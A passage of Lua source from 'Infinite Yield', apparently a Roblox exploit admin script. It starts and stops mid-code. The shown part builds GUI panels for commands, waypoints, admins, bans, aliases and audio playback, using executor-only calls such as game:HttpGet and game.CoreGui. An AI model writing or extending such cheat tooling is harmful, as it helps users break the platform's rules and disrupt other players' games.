PART.CFrame = newcf end end) end

hastab = {}
addcmd('tablet','opens tablet gui',{},
function(args, speaker)
for _, child in pairs( workspace:GetChildren()) do
    if child.Name == speaker.Name .. "TAB" then
        child:Destroy() end end
game:GetService('Chat'):Chat(speaker.Character, 'The command to close is "'.. cmdprefix .. 'dismiss"', 1)
local GUI = Instance.new("SurfaceGui")
local holder = Instance.new("Frame")
local bar = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local MAIN = Instance.new("Frame")
local Example = Instance.new("TextLabel")
local CMDs = Instance.new("ScrollingFrame")
local PART = Instance.new("Part")
PART.Name = speaker.Name .. 'TAB'
PART.Color = maincolor
PART.Size = Vector3.new(7, 7.8, 0.2)
PART.Transparency = 0
PART.Locked = true
PART.CanCollide = false
PART.Parent = workspace
PART.Anchored = true
PART.Material = "Neon"
local GUI = Instance.new("SurfaceGui")
local holder = Instance.new("Frame")
local bar = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local MAIN = Instance.new("Frame")
local Example = Instance.new("TextLabel")
local CMDs = Instance.new("ScrollingFrame")
GUI.Name = "GUI"
GUI.Parent = PART
GUI.CanvasSize = Vector2.new(500, 600)
GUI.Face = Enum.NormalId.Back
holder.Name = "holder"
holder.Parent = GUI
holder.BackgroundColor3 = Color3.new(1, 1, 1)
holder.BackgroundTransparency = 1
holder.BorderSizePixel = 2
holder.Position = UDim2.new(0, 0, 0, 10)
holder.Size = UDim2.new(0, 300, 0, 330)
holder.ZIndex = 2
bar.Name = "bar"
bar.Parent = holder
bar.BackgroundColor3 = Color3.new(0, 0, 0)
bar.BackgroundTransparency = 0.89999997615814
bar.BorderSizePixel = 0
bar.Position = UDim2.new(0, 10, 1, -330)
bar.Size = UDim2.new(0, 480, 0, 33)
Title.Name = "Title"
Title.Parent = bar
Title.BackgroundColor3 = Color3.new(0.639216, 0.635294, 0.647059)
Title.BackgroundTransparency = 1
Title.Size = UDim2.new(1, 0, 0, 30)
Title.Font = Enum.Font.SourceSansBold
Title.FontSize = Enum.FontSize.Size24
Title.Text = "[Infinite Yield] Command List"
Title.TextColor3 = Color3.new(0.980392, 0.980392, 0.980392)
MAIN.Name = "MAIN"
MAIN.Parent = holder
MAIN.BackgroundColor3 = Color3.new(0, 0, 0)
MAIN.BackgroundTransparency = 0.89999997615814
MAIN.BorderSizePixel = 0
MAIN.Position = UDim2.new(0, 10, 1, -300)
MAIN.Size = UDim2.new(0, 480, 0, 550)
Example.Name = "Example"
Example.Parent = MAIN
Example.BackgroundColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
Example.BackgroundTransparency = 1
Example.BorderColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
Example.BorderSizePixel = 0
Example.Size = UDim2.new(0, 190, 0, 40)
Example.Visible = false
Example.Font = Enum.Font.SourceSansBold
Example.FontSize = Enum.FontSize.Size36
Example.Text = "txt"
Example.TextColor3 = Color3.new(0.972549, 0.972549, 0.972549)
Example.TextStrokeTransparency = 0
Example.TextXAlignment = Enum.TextXAlignment.Left
Example.ZIndex = 6
CMDs.Name = "CMDs"
CMDs.Parent = MAIN
CMDs.BackgroundColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
CMDs.BackgroundTransparency = 1
CMDs.BorderColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
CMDs.BorderSizePixel = 0
CMDs.Size = UDim2.new(0, 480, 0, 550)
CMDs.BottomImage = "rbxasset://textures/blackBkg_square.png"
CMDs.CanvasSize = UDim2.new(0, 0, 0, 4880)
CMDs.MidImage = "rbxasset://textures/blackBkg_square.png"
CMDs.ScrollBarThickness = 15
CMDs.TopImage = "rbxasset://textures/blackBkg_square.png"
	local CMDsV = CMDsFolder:GetChildren()
	for i = 1, #CMDsV do
		local YSize = 35
		local Position = ((i * YSize) - YSize)
		local newcmd = Example:Clone()
		newcmd.Parent = CMDs
		newcmd.Visible = true
		newcmd.Position = UDim2.new(0,10,0, Position + 1)
		newcmd.Text = "" .. CMDsV[i].Value
	CMDs.CanvasSize = UDim2.new(0,0,0, Position + 40) end
local cf = speaker.Character.HumanoidRootPart.CFrame
local newcf = cf + cf.lookVector * 6 + Vector3.new(0, 1, 0)
PART.CFrame = newcf
speaker.Character.Humanoid.Died:connect(function()
PART:Destroy() end)
wait(1)
PART.Transparency = 0.1 wait(0.05) PART.Transparency = 0.2 wait(0.05)
PART.Transparency = 0.3 wait(0.05) PART.Transparency = 0.4 wait(0.05)
PART.Transparency = 0.5 wait(0.05) PART.Transparency = 0.6 wait(0.05)
if FindTable(hastab, speaker.Name) then movetab(speaker,PART) return end
table.insert(hastab, speaker.Name) movetab(speaker,PART)
end)

function updatepositions()
	if PList then
	PList:ClearAllChildren()
	PList.CanvasSize = UDim2.new(0, 0, 0, 10)
	for i = 1, #WayPoints do
		local YSize = 25
		local Position = ((i * YSize) - YSize)
		local newcmd = Example:Clone()
		newcmd.Parent = PList
		newcmd.Visible = true
		newcmd.Position = UDim2.new(0,5,0, Position + 5)
		newcmd.Text = "    " .. WayPoints[i].NAME .. ": " .. WayPoints[i].COORD[1] .. ", " .. WayPoints[i].COORD[2] .. ", " .. WayPoints[i].COORD[3]
		PList.CanvasSize = UDim2.new(0,0,0, Position + 30)
		local gotoBtn = Instance.new("TextButton")
		gotoBtn.Name = "goto"
		gotoBtn.Parent = PList
		gotoBtn.BackgroundColor3 = Color3.new(255, 255, 255)
		gotoBtn.BackgroundTransparency = 0.30000001192093
		gotoBtn.BorderColor3 = Color3.new(1, 0, 0)
		gotoBtn.BorderSizePixel = 0
		gotoBtn.Position = UDim2.new(0,-10,0, Position + 5)
		gotoBtn.Size = UDim2.new(0, 20, 0, 20)
		gotoBtn.FontSize = Enum.FontSize.Size14
		gotoBtn.Text = ""
		gotoBtn.ZIndex = 6
		gotoBtn.MouseButton1Click:Connect(function()
		execCmd("loadpos "..LP.Name.." "..WayPoints[i].NAME)
		end)
	end
	end
end

posopen = false
addcmd("positions","lists waypoints",{'pos'},
function(args, speaker)
if posopen == false then
posopen = true
local Pos = Instance.new("ScreenGui")
local drag = Instance.new("Frame")
local PromptDialog = Instance.new("Frame")
local shadow = Instance.new("Frame")
local PopupText = Instance.new("TextLabel")
local Exit = Instance.new("TextButton")
local ContainerFrame = Instance.new("Frame")
PList = Instance.new("ScrollingFrame")
Pos.Name = "Pos"
Pos.Parent = game.CoreGui
drag.Name = "drag"
drag.Parent = Pos
drag.Active = true
drag.BackgroundColor3 = Color3.new(1, 1, 1)
drag.BackgroundTransparency = 1
dragGUI(drag)
drag.Position = UDim2.new(0.5, -150, 0, -400)
drag.Size = UDim2.new(0, 290, 0, 30)
PromptDialog.Name = "PromptDialog"
PromptDialog.Parent = drag
PromptDialog.BackgroundColor3 = Color3.new(0, 0, 0)
PromptDialog.BackgroundTransparency = 1
PromptDialog.BorderSizePixel = 0
PromptDialog.Position = UDim2.new(0, -10, 0, 0)
PromptDialog.Size = UDim2.new(0, 310, 0, 300)
PromptDialog.ZIndex = 8
shadow.Name = "shadow"
shadow.Parent = PromptDialog
shadow.BackgroundColor3 = maincolor
shadow.BackgroundTransparency = 0.30000001192093
shadow.BorderColor3 = Color3.new(0, 0, 0)
shadow.BorderSizePixel = 0
shadow.Position = UDim2.new(0.0322580636, 0, 0.00999999978, 0)
shadow.Size = UDim2.new(0, 290, 0, 26)
PopupText.Name = "PopupText"
PopupText.Parent = shadow
PopupText.BackgroundTransparency = 1
PopupText.Position = UDim2.new(0, 8, 0, -3)
PopupText.Size = UDim2.new(1, -16, 0.538461566, 0)
PopupText.ZIndex = 110
PopupText.Font = Enum.Font.SourceSansBold
PopupText.FontSize = Enum.FontSize.Size28
PopupText.Text = "Positions"
PopupText.TextColor3 = Color3.new(0.97, 0.97, 0.97)
PopupText.TextStrokeTransparency = 0
PopupText.TextWrapped = true
PopupText.TextYAlignment = Enum.TextYAlignment.Top
Exit.Name = "Exit"
Exit.Parent = shadow
Exit.BackgroundColor3 = Color3.new(1, 0, 0)
Exit.BackgroundTransparency = 0.30000001192093
Exit.BorderColor3 = Color3.new(1, 0, 0)
Exit.BorderSizePixel = 0
Exit.Position = UDim2.new(0, 267, 0, 3)
Exit.Size = UDim2.new(0, 20, 0, 20)
Exit.FontSize = Enum.FontSize.Size14
Exit.Text = ""
ContainerFrame.Name = "ContainerFrame"
ContainerFrame.Parent = PromptDialog
ContainerFrame.BackgroundColor3 = maincolor
ContainerFrame.BackgroundTransparency = 0.5
ContainerFrame.BorderColor3 = Color3.new(0, 0, 0)
ContainerFrame.BorderSizePixel = 0
ContainerFrame.Position = UDim2.new(0, 10, 0, 29)
ContainerFrame.Size = UDim2.new(0.935483873, 0, 0.806666672, 0)
ContainerFrame.ZIndex = 5
PList.Name = "List"
PList.Parent = ContainerFrame
PList.BackgroundColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
PList.BackgroundTransparency = 1
PList.BorderColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
PList.BorderSizePixel = 0
PList.Position = UDim2.new(0, 10, 0, 5)
PList.Size = UDim2.new(0, 280, 0, 230)
PList.ZIndex = 6
PList.BottomImage = "rbxasset://textures/blackBkg_square.png"
PList.CanvasSize = UDim2.new(0, 0, 0, 10)
PList.MidImage = "rbxasset://textures/blackBkg_square.png"
PList.ScrollBarThickness = 8
PList.TopImage = "rbxasset://textures/blackBkg_square.png"
updatepositions()
drag:TweenPosition(UDim2.new(0.5, -150, 0, 100), "InOut", "Quart", 0.5, true, nil) 
Exit.MouseButton1Click:Connect(function()
drag:TweenPosition(UDim2.new(0.5, -150, 0, -400), "InOut", "Quart", 0.5, true, nil) 
wait(0.6) posopen = false Pos:Destroy() end) end
end)

function updateadmins()
	if AList then
	AList:ClearAllChildren()
	AList.CanvasSize = UDim2.new(0, 0, 0, 10)
	for i = 1, #adminname do
		local YSize = 25
		local Position = ((i * YSize) - YSize)
		local newcmd = Example:Clone()
		newcmd.Parent = AList
		newcmd.Visible = true
		newcmd.Position = UDim2.new(0,5,0, Position + 5)
		newcmd.Text = adminname[i].NAME
		AList.CanvasSize = UDim2.new(0,0,0, Position + 30)
	end
	end
end

adminsopen = false
adminname = {}
addcmd('admins','displays admins',{'adminlist'},
function(args, speaker)
if speaker.userId ~= LP.userId then
lponly(speaker) else
if adminsopen == false then
adminsopen = true
local admins = Instance.new("ScreenGui")
local drag = Instance.new("Frame")
local PromptDialog = Instance.new("Frame")
local shadow = Instance.new("Frame")
local PopupText = Instance.new("TextLabel")
local Exit = Instance.new("TextButton")
local ContainerFrame = Instance.new("Frame")
AList = Instance.new("ScrollingFrame")
admins.Name = "Admins"
admins.Parent = game.CoreGui
drag.Name = "drag"
drag.Parent = admins
drag.Active = true
drag.BackgroundColor3 = Color3.new(1, 1, 1)
drag.BackgroundTransparency = 1
dragGUI(drag)
drag.Position = UDim2.new(0.5, -150, 0, -400)
drag.Size = UDim2.new(0, 290, 0, 30)
PromptDialog.Name = "PromptDialog"
PromptDialog.Parent = drag
PromptDialog.BackgroundColor3 = Color3.new(0, 0, 0)
PromptDialog.BackgroundTransparency = 1
PromptDialog.BorderSizePixel = 0
PromptDialog.Position = UDim2.new(0, -10, 0, 0)
PromptDialog.Size = UDim2.new(0, 310, 0, 300)
PromptDialog.ZIndex = 8
shadow.Name = "shadow"
shadow.Parent = PromptDialog
shadow.BackgroundColor3 = maincolor
shadow.BackgroundTransparency = 0.30000001192093
shadow.BorderColor3 = Color3.new(0, 0, 0)
shadow.BorderSizePixel = 0
shadow.Position = UDim2.new(0.0322580636, 0, 0.00999999978, 0)
shadow.Size = UDim2.new(0, 290, 0, 26)
PopupText.Name = "PopupText"
PopupText.Parent = shadow
PopupText.BackgroundTransparency = 1
PopupText.Position = UDim2.new(0, 8, 0, -3)
PopupText.Size = UDim2.new(1, -16, 0.538461566, 0)
PopupText.ZIndex = 110
PopupText.Font = Enum.Font.SourceSansBold
PopupText.FontSize = Enum.FontSize.Size28
PopupText.Text = "Admins"
PopupText.TextColor3 = Color3.new(0.97, 0.97, 0.97)
PopupText.TextStrokeTransparency = 0
PopupText.TextWrapped = true
PopupText.TextYAlignment = Enum.TextYAlignment.Top
Exit.Name = "Exit"
Exit.Parent = shadow
Exit.BackgroundColor3 = Color3.new(1, 0, 0)
Exit.BackgroundTransparency = 0.30000001192093
Exit.BorderColor3 = Color3.new(1, 0, 0)
Exit.BorderSizePixel = 0
Exit.Position = UDim2.new(0, 267, 0, 3)
Exit.Size = UDim2.new(0, 20, 0, 20)
Exit.FontSize = Enum.FontSize.Size14
Exit.Text = ""
ContainerFrame.Name = "ContainerFrame"
ContainerFrame.Parent = PromptDialog
ContainerFrame.BackgroundColor3 = maincolor
ContainerFrame.BackgroundTransparency = 0.5
ContainerFrame.BorderColor3 = Color3.new(0, 0, 0)
ContainerFrame.BorderSizePixel = 0
ContainerFrame.Position = UDim2.new(0, 10, 0, 29)
ContainerFrame.Size = UDim2.new(0.935483873, 0, 0.806666672, 0)
ContainerFrame.ZIndex = 5
AList.Name = "List"
AList.Parent = ContainerFrame
AList.BackgroundColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
AList.BackgroundTransparency = 1
AList.BorderColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
AList.BorderSizePixel = 0
AList.Position = UDim2.new(0, 10, 0, 5)
AList.Size = UDim2.new(0, 280, 0, 230)
AList.ZIndex = 6
AList.BottomImage = "rbxasset://textures/blackBkg_square.png"
AList.CanvasSize = UDim2.new(0, 0, 0, 10)
AList.MidImage = "rbxasset://textures/blackBkg_square.png"
AList.ScrollBarThickness = 8
AList.TopImage = "rbxasset://textures/blackBkg_square.png"
updateadmins()
drag:TweenPosition(UDim2.new(0.5, -150, 0, 100), "InOut", "Quart", 0.5, true, nil) 
Exit.MouseButton1Click:Connect(function()
drag:TweenPosition(UDim2.new(0.5, -150, 0, -400), "InOut", "Quart", 0.5, true, nil) 
wait(0.6) adminsopen = false admins:Destroy() end) end end
end)

function updatebans()
	if BList then
	BList:ClearAllChildren()
	BList.CanvasSize = UDim2.new(0, 0, 0, 10)
	for i = 1, #banname do
		local YSize = 25
		local Position = ((i * YSize) - YSize)
		local newcmd = Example:Clone()
		newcmd.Parent = BList
		newcmd.Visible = true
		newcmd.Position = UDim2.new(0,5,0, Position + 5)
		newcmd.Text = "    Name: " .. banname[i].NAME .. " | ID: " .. banname[i].ID .. " | Age: " .. banname[i].AGE
		newcmd.TextSize = 20
		BList.CanvasSize = UDim2.new(0,0,0, Position + 30)
		local delet = Instance.new("TextButton")
		delet.Name = "delet"
		delet.Parent = BList
		delet.BackgroundColor3 = Color3.new(1, 0, 0)
		delet.BackgroundTransparency = 0.30000001192093
		delet.BorderColor3 = Color3.new(1, 0, 0)
		delet.BorderSizePixel = 0
		delet.Position = UDim2.new(0,-10,0, Position + 5)
		delet.Size = UDim2.new(0, 20, 0, 20)
		delet.FontSize = Enum.FontSize.Size14
		delet.Text = ""
		delet.ZIndex = 6
		delet.MouseButton1Click:Connect(function()
		execCmd("unban "..banname[i].NAME)
		end)
	end
	end
end

banname = {}
bansopen = false
addcmd('bans','displays bans',{'banlist'},
function(args, speaker)
if speaker.userId ~= LP.userId then
lponly(speaker) else
if bansopen == false then
bansopen = true
local Bans = Instance.new("ScreenGui")
local drag = Instance.new("Frame")
local PromptDialog = Instance.new("Frame")
local ContainerFrame = Instance.new("Frame")
BList = Instance.new("ScrollingFrame")
local shadow = Instance.new("Frame")
local Exit = Instance.new("TextButton")
local PopupText = Instance.new("TextLabel")
Bans.Name = "Bans"
Bans.Parent = game.CoreGui
drag.Name = "drag"
drag.Parent = Bans
drag.Active = true
drag.BackgroundColor3 = Color3.new(1, 1, 1)
drag.BackgroundTransparency = 1
dragGUI(drag)
drag.Position = UDim2.new(0.5, -225, 0, -400)
drag.Size = UDim2.new(0, 438, 0, 26)
PromptDialog.Name = "PromptDialog"
PromptDialog.Parent = drag
PromptDialog.BackgroundColor3 = Color3.new(0, 0, 0)
PromptDialog.BackgroundTransparency = 1
PromptDialog.BorderSizePixel = 0
PromptDialog.Position = UDim2.new(0, 0, 0, -2)
PromptDialog.Size = UDim2.new(0, 438, 0, 300)
PromptDialog.ZIndex = 5
ContainerFrame.Name = "ContainerFrame"
ContainerFrame.Parent = PromptDialog
ContainerFrame.BackgroundColor3 = maincolor
ContainerFrame.BackgroundTransparency = 0.5
ContainerFrame.BorderColor3 = Color3.new(0, 0, 0)
ContainerFrame.BorderSizePixel = 0
ContainerFrame.Position = UDim2.new(0, 0, 0, 29)
ContainerFrame.Size = UDim2.new(1, 0, 0.829999983, 0)
ContainerFrame.ZIndex = 5
BList.Name = "List"
BList.Parent = ContainerFrame
BList.BackgroundColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
BList.BackgroundTransparency = 1
BList.BorderColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
BList.BorderSizePixel = 0
BList.Position = UDim2.new(0, 10, 0, 9)
BList.Size = UDim2.new(0, 428, 0, 230)
BList.ZIndex = 5
BList.BottomImage = "rbxasset://textures/blackBkg_square.png"
BList.CanvasSize = UDim2.new(0, 0, 0, 10)
BList.MidImage = "rbxasset://textures/blackBkg_square.png"
BList.ScrollBarThickness = 8
BList.TopImage = "rbxasset://textures/blackBkg_square.png"
shadow.Name = "shadow"
shadow.Parent = PromptDialog
shadow.BackgroundColor3 = maincolor
shadow.BackgroundTransparency = 0.30000001192093
shadow.BorderColor3 = Color3.new(0, 0, 0)
shadow.BorderSizePixel = 0
shadow.Position = UDim2.new(0, 0, 0.00999999978, 0)
shadow.Size = UDim2.new(0, 438, 0, 26)
Exit.Name = "Exit"
Exit.Parent = shadow
Exit.BackgroundColor3 = Color3.new(1, 0, 0)
Exit.BackgroundTransparency = 0.30000001192093
Exit.BorderColor3 = Color3.new(1, 0, 0)
Exit.BorderSizePixel = 0
Exit.Position = UDim2.new(0, 415, 0, 3)
Exit.Size = UDim2.new(0, 20, 0, 20)
Exit.FontSize = Enum.FontSize.Size14
Exit.Text = ""
PopupText.Name = "PopupText"
PopupText.Parent = shadow
PopupText.BackgroundTransparency = 1
PopupText.Position = UDim2.new(0, 61, 0, -4)
PopupText.Size = UDim2.new(0.760273993, -16, 1.15384614, 0)
PopupText.ZIndex = 6
PopupText.Font = Enum.Font.SourceSansBold
PopupText.FontSize = Enum.FontSize.Size32
PopupText.Text = "Bans"
PopupText.TextColor3 = Color3.new(0.97, 0.97, 0.97)
PopupText.TextStrokeTransparency = 0
PopupText.TextWrapped = true
PopupText.TextYAlignment = Enum.TextYAlignment.Top
updatebans()
drag:TweenPosition(UDim2.new(0.5, -225, 0, 100), "InOut", "Quart", 0.5, true, nil)
Exit.MouseButton1Click:Connect(function()
drag:TweenPosition(UDim2.new(0.5, -225, 0, -400), "InOut", "Quart", 0.5, true, nil)
wait(0.6) bansopen = false Bans:Destroy() end) end end
end)

function updatealiases()
	if AlList then
	AlList:ClearAllChildren()
	AlList.CanvasSize = UDim2.new(0, 0, 0, 10)
	for i = 1, #aliasSave do
		local YSize = 25
		local Position = ((i * YSize) - YSize)
		local newcmd = Example:Clone()
		newcmd.Parent = AlList
		newcmd.Visible = true
		newcmd.Position = UDim2.new(0,5,0, Position + 5)
		newcmd.Text = '    Command: ['..aliasSave[i].CMD..'] Alias: ['..aliasSave[i].ALIAS..']'
		newcmd.TextSize = 20
		AlList.CanvasSize = UDim2.new(0,0,0, Position + 30)
		local delet = Instance.new("TextButton")
		delet.Name = "delet"
		delet.Parent = AlList
		delet.BackgroundColor3 = Color3.new(1, 0, 0)
		delet.BackgroundTransparency = 0.30000001192093
		delet.BorderColor3 = Color3.new(1, 0, 0)
		delet.BorderSizePixel = 0
		delet.Position = UDim2.new(0,-10,0, Position + 5)
		delet.Size = UDim2.new(0, 20, 0, 20)
		delet.FontSize = Enum.FontSize.Size14
		delet.Text = ""
		delet.ZIndex = 6
		delet.MouseButton1Click:Connect(function()
		execCmd("removealias "..aliasSave[i].ALIAS)
		end)
	end
	end
end

aliasesopen = false
addcmd('aliases','displays aliases',{},
function(args, speaker)
if speaker.userId ~= LP.userId then
lponly(speaker) else
if aliasesopen == false then
aliasesopen = true
local aliases = Instance.new("ScreenGui")
local drag = Instance.new("Frame")
local PromptDialog = Instance.new("Frame")
local ContainerFrame = Instance.new("Frame")
AlList = Instance.new("ScrollingFrame")
local shadow = Instance.new("Frame")
local Exit = Instance.new("TextButton")
local PopupText = Instance.new("TextLabel")
aliases.Name = "Aliases"
aliases.Parent = game.CoreGui
drag.Name = "drag"
drag.Parent = aliases
drag.Active = true
drag.BackgroundColor3 = Color3.new(1, 1, 1)
drag.BackgroundTransparency = 1
dragGUI(drag)
drag.Position = UDim2.new(0.5, -225, 0, -400)
drag.Size = UDim2.new(0, 438, 0, 26)
PromptDialog.Name = "PromptDialog"
PromptDialog.Parent = drag
PromptDialog.BackgroundColor3 = Color3.new(0, 0, 0)
PromptDialog.BackgroundTransparency = 1
PromptDialog.BorderSizePixel = 0
PromptDialog.Position = UDim2.new(0, 0, 0, -2)
PromptDialog.Size = UDim2.new(0, 438, 0, 300)
PromptDialog.ZIndex = 5
ContainerFrame.Name = "ContainerFrame"
ContainerFrame.Parent = PromptDialog
ContainerFrame.BackgroundColor3 = maincolor
ContainerFrame.BackgroundTransparency = 0.5
ContainerFrame.BorderColor3 = Color3.new(0, 0, 0)
ContainerFrame.BorderSizePixel = 0
ContainerFrame.Position = UDim2.new(0, 0, 0, 29)
ContainerFrame.Size = UDim2.new(1, 0, 0.829999983, 0)
ContainerFrame.ZIndex = 5
AlList.Name = "List"
AlList.Parent = ContainerFrame
AlList.BackgroundColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
AlList.BackgroundTransparency = 1
AlList.BorderColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
AlList.BorderSizePixel = 0
AlList.Position = UDim2.new(0, 10, 0, 9)
AlList.Size = UDim2.new(0, 428, 0, 230)
AlList.ZIndex = 5
AlList.BottomImage = "rbxasset://textures/blackBkg_square.png"
AlList.CanvasSize = UDim2.new(0, 0, 0, 10)
AlList.MidImage = "rbxasset://textures/blackBkg_square.png"
AlList.ScrollBarThickness = 8
AlList.TopImage = "rbxasset://textures/blackBkg_square.png"
shadow.Name = "shadow"
shadow.Parent = PromptDialog
shadow.BackgroundColor3 = maincolor
shadow.BackgroundTransparency = 0.30000001192093
shadow.BorderColor3 = Color3.new(0, 0, 0)
shadow.BorderSizePixel = 0
shadow.Position = UDim2.new(0, 0, 0.00999999978, 0)
shadow.Size = UDim2.new(0, 438, 0, 26)
Exit.Name = "Exit"
Exit.Parent = shadow
Exit.BackgroundColor3 = Color3.new(1, 0, 0)
Exit.BackgroundTransparency = 0.30000001192093
Exit.BorderColor3 = Color3.new(1, 0, 0)
Exit.BorderSizePixel = 0
Exit.Position = UDim2.new(0, 415, 0, 3)
Exit.Size = UDim2.new(0, 20, 0, 20)
Exit.FontSize = Enum.FontSize.Size14
Exit.Text = ""
PopupText.Name = "PopupText"
PopupText.Parent = shadow
PopupText.BackgroundTransparency = 1
PopupText.Position = UDim2.new(0, 61, 0, -4)
PopupText.Size = UDim2.new(0.760273993, -16, 1.15384614, 0)
PopupText.ZIndex = 6
PopupText.Font = Enum.Font.SourceSansBold
PopupText.FontSize = Enum.FontSize.Size32
PopupText.Text = "Aliases"
PopupText.TextColor3 = Color3.new(0.97, 0.97, 0.97)
PopupText.TextStrokeTransparency = 0
PopupText.TextWrapped = true
PopupText.TextYAlignment = Enum.TextYAlignment.Top
updatealiases()
drag:TweenPosition(UDim2.new(0.5, -225, 0, 100), "InOut", "Quart", 0.5, true, nil)
Exit.MouseButton1Click:Connect(function()
drag:TweenPosition(UDim2.new(0.5, -225, 0, -400), "InOut", "Quart", 0.5, true, nil)
wait(0.6) aliasesopen = false aliases:Destroy() end) end end
end)

addcmd('sound', 'plays a sound',{'music','play'},
function(args, speaker)
	if isNumber(args[1]) then
	for i,v in pairs(game:GetDescendants()) do
	if v:IsA'Sound'then v:Destroy() end end
    local c = args[1] or 'stop'
    if std.inTable({'stop'}, c:lower()) then return end
	local s = Instance.new("Sound", workspace)
	s.Name = "IYsound"
	s.Looped = true
	s.SoundId = "rbxassetid://" .. c
    s.Volume = 1
	s:Play()
	local Asset = game:GetService("MarketplaceService"):GetProductInfo(c)
	playerenabled = false
	Notify('Playing: '..Asset.Name..' ('..c..')')
	else
	local name = GLS(false, 0)
if GLS(false, 0) == "stop" or GLS(false, 0) == "off" then
Notify('Stopped audio')
for i,v in pairs(game:GetDescendants()) do
if v:IsA'Sound'then v:Destroy() end end
return
end
Notify('Loading list...')
local Audios = Instance.new("ScreenGui")
local drag = Instance.new("Frame")
local PromptDialog = Instance.new("Frame")
local ContainerFrame = Instance.new("Frame")
local AudList = Instance.new("ScrollingFrame")
local shadow = Instance.new("Frame")
local Exit = Instance.new("TextButton")
local PopupText = Instance.new("TextLabel")
local Hide = Instance.new("TextButton")
Audios.Name = "Audios"
Audios.Parent = game.CoreGui
drag.Name = "drag"
drag.Parent = Audios
drag.Active = true
drag.BackgroundColor3 = Color3.new(1, 1, 1)
drag.BackgroundTransparency = 1
dragGUI(drag)
drag.Position = UDim2.new(0.5, -225, 0, -400)
drag.Size = UDim2.new(0, 438, 0, 26)
PromptDialog.Name = "PromptDialog"
PromptDialog.Parent = drag
PromptDialog.BackgroundColor3 = Color3.new(0, 0, 0)
PromptDialog.BackgroundTransparency = 1
PromptDialog.BorderSizePixel = 0
PromptDialog.Position = UDim2.new(0, 0, 0, -2)
PromptDialog.Size = UDim2.new(0, 438, 0, 300)
PromptDialog.ZIndex = 5
PromptDialog.ClipsDescendants = true
ContainerFrame.Name = "ContainerFrame"
ContainerFrame.Parent = PromptDialog
ContainerFrame.BackgroundColor3 = maincolor
ContainerFrame.BackgroundTransparency = 0.5
ContainerFrame.BorderColor3 = Color3.new(0, 0, 0)
ContainerFrame.BorderSizePixel = 0
ContainerFrame.Position = UDim2.new(0, 0, 0, 29)
ContainerFrame.Size = UDim2.new(1, 0, 0.829999983, 0)
ContainerFrame.ZIndex = 5
AudList.Name = "List"
AudList.Parent = ContainerFrame
AudList.BackgroundColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
AudList.BackgroundTransparency = 1
AudList.BorderColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
AudList.BorderSizePixel = 0
AudList.Position = UDim2.new(0, 10, 0, 9)
AudList.Size = UDim2.new(0, 428, 0, 230)
AudList.ZIndex = 5
AudList.BottomImage = "rbxasset://textures/blackBkg_square.png"
AudList.CanvasSize = UDim2.new(0, 0, 0, 10)
AudList.MidImage = "rbxasset://textures/blackBkg_square.png"
AudList.ScrollBarThickness = 8
AudList.TopImage = "rbxasset://textures/blackBkg_square.png"
shadow.Name = "shadow"
shadow.Parent = PromptDialog
shadow.BackgroundColor3 = maincolor
shadow.BackgroundTransparency = 0.30000001192093
shadow.BorderColor3 = Color3.new(0, 0, 0)
shadow.BorderSizePixel = 0
shadow.Position = UDim2.new(0, 0, 0.00999999978, 0)
shadow.Size = UDim2.new(0, 438, 0, 26)
Exit.Name = "Exit"
Exit.Parent = shadow
Exit.BackgroundColor3 = Color3.new(1, 0, 0)
Exit.BackgroundTransparency = 0.30000001192093
Exit.BorderColor3 = Color3.new(1, 0, 0)
Exit.BorderSizePixel = 0
Exit.Position = UDim2.new(0, 415, 0, 3)
Exit.Size = UDim2.new(0, 20, 0, 20)
Exit.FontSize = Enum.FontSize.Size14
Exit.Text = ""
PopupText.Name = "PopupText"
PopupText.Parent = shadow
PopupText.BackgroundTransparency = 1
PopupText.Position = UDim2.new(0, 61, 0, -4)
PopupText.Size = UDim2.new(0.760273993, -16, 1.15384614, 0)
PopupText.ZIndex = 6
PopupText.Font = Enum.Font.SourceSansBold
PopupText.FontSize = Enum.FontSize.Size32
PopupText.Text = GLS(false, 0).." [Audio]"
PopupText.TextScaled = true
PopupText.TextColor3 = Color3.new(0.97, 0.97, 0.97)
PopupText.TextStrokeTransparency = 0
PopupText.TextWrapped = true
PopupText.TextYAlignment = Enum.TextYAlignment.Center
Hide.Name = "Hide"
Hide.Parent = shadow
Hide.BackgroundColor3 = Color3.new(1, 1, 1)
Hide.BackgroundTransparency = 0.30000001192093
Hide.BorderColor3 = Color3.new(1, 1, 1)
Hide.BorderSizePixel = 0
Hide.Position = UDim2.new(0.800000012, 41, 0, 3)
Hide.Size = UDim2.new(0, 20, 0, 20)
Hide.FontSize = Enum.FontSize.Size14
Hide.Text = ""
local hidden = false
Hide.MouseButton1Down:connect(function()
if hidden == false then hidden = true
ContainerFrame:TweenPosition(UDim2.new(0, 0, 0, -300), "InOut", "Quart", 0.5, true, nil)
else ContainerFrame:TweenPosition(UDim2.new(0, 0, 0, 29), "InOut", "Quart", 0.5, true, nil) hidden = false
end end)
local json = game:HttpGet("https://search.roblox.com/catalog/json?Category=Audio&Keyword="..GLS(false, 0).."&ResultsPerPage=50", true)
local results = HttpService:JSONDecode(json)
if #results == 0 then
Notify('No audio found :(')
Audios:Destroy()
return
end
for i,v in pairs(results) do
		local YSize = 25
		local Position = ((i * YSize) - YSize)
		local newcmd = Example:Clone()
		newcmd.Parent = AudList
		newcmd.Visible = true
		newcmd.Position = UDim2.new(0,5,0, Position + 5)
		newcmd.Text = "    "..v.Name
		newcmd.TextSize = 20
		AudList.CanvasSize = UDim2.new(0,0,0, Position + 30)
		local play = Instance.new("TextButton")
		play.Name = "play"
		play.Parent = AudList
		play.BackgroundColor3 = Color3.new(255, 255, 255)
		play.BackgroundTransparency = 0.30000001192093
		play.BorderColor3 = Color3.new(1, 0, 0)
		play.BorderSizePixel = 0
